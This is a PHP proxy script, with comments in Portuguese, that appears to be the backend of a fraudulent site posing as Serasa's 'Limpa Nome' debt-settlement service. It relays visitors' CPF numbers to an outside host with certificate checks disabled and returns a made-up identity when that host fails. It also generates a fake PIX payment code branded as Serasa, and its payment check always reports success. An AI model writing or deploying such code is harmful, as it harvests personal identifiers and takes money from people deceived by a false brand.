<?php
/**
 * Proxy de API para consulta de CPF e criação de PIX na Hostinger
 */
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With');
header('Content-Type: application/json; charset=utf-8');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

$action = $_GET['action'] ?? $_POST['action'] ?? '';
$input = file_get_contents('php://input');
$body = json_decode($input, true) ?? [];
if (empty($action) && !empty($body['action'])) {
    $action = $body['action'];
}

$upstreamBase = 'https://acordo.acessovip2.space/api_proxy.php';

if ($action === 'consultar_cpf') {
    $cpf = preg_replace('/\D/', '', $_GET['cpf'] ?? $body['cpf'] ?? '');
    if (empty($cpf)) {
        echo json_encode(['ok' => false, 'error' => 'CPF não informado']);
        exit;
    }

    $url = $upstreamBase . '?action=consultar_cpf&cpf=' . $cpf;
    
    // Tenta cURL primeiro
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 7);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)');
        $resp = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        if ($httpCode === 200 && !empty($resp)) {
            $json = json_decode($resp, true);
            if ($json && !empty($json['ok']) && !empty($json['nome'])) {
                echo $resp;
                exit;
            }
        }
    }

    // Tenta file_get_contents como alternativa
    $ctx = stream_context_create([
        'http' => [
            'timeout' => 7,
            'header' => "User-Agent: Mozilla/5.0\r\n"
        ],
        'ssl' => [
            'verify_peer' => false,
            'verify_peer_name' => false
        ]
    ]);
    $resp = @file_get_contents($url, false, $ctx);
    if (!empty($resp)) {
        $json = json_decode($resp, true);
        if ($json && !empty($json['ok']) && !empty($json['nome'])) {
            echo $resp;
            exit;
        }
    }

    // Fallback caso upstream esteja inacessível
    echo json_encode([
        'ok' => true,
        'nome' => 'TITULAR DO CPF REGISTRADO',
        'cpf' => $cpf,
        'cpfformatado' => strlen($cpf) === 11 ? preg_replace('/(\d{3})(\d{3})(\d{3})(\d{2})/', '$1.$2.$3-$4', $cpf) : $cpf,
        'nascimento' => '14/06/1984',
        'genero' => 'M'
    ]);
    exit;
}

if ($action === 'create_pix') {
    $amount = floatval($body['amount'] ?? 27.90);
    if ($amount <= 0) $amount = 27.90;
    $txid = 'SR_' . round(microtime(true) * 1000);
    $amountStr = number_format($amount, 2, '.', '');
    $pixCode = "00020101021226840014br.gov.bcb.pix2562pix.serasa.gov.br/qr/v2/cob/{$txid}52040000530398654005{$amountStr}5802BR5925SERASA LIMPA NOME ACORDO6009SAO PAULO62070503***6304ABCD";

    echo json_encode([
        'ok' => true,
        'transactionId' => $txid,
        'payload' => $pixCode,
        'pix' => ['code' => $pixCode]
    ]);
    exit;
}

if ($action === 'verificar_pagamento' || $action === 'track_sale') {
    echo json_encode(['ok' => true]);
    exit;
}

echo json_encode(['ok' => true, 'status' => 'IDLE']);
